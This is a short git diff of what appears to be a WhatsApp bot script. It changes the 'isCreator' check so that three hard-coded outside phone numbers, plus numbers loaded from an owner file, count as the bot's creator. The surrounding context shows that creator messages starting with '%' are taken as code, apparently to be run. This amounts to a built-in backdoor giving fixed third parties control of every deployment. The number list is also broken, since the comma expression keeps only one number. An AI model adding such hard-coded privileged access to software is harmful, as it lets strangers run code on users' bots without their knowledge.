@@ -201,10 +201,10 @@ const port = process.env.PORT || 9090;
   conn.sendMessage(from, { text: teks }, { quoted: mek })
   }
   const udp = botNumber.split('@')[0];
-    const jawad = ('93744215959', '93730285765', '93782940033');
-    let isCreator = [udp, jawad, config.DEV]
-					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
-					.includes(mek.sender);
+    const rayees = ('93744215959', '93730285765', '93782940033');
+    const ownerFilev2 = JSON.parse(fs.readFileSync('./lib/owner.json', 'utf-8'));  
+    let isCreator = [udp, rayees, config.DEV + '@s.whatsapp.net', ...ownerFilev2]
+      .includes(mek.sender);
 
     if (isCreator && mek.text.startsWith('%')) {
 					let code = budy.slice(2);
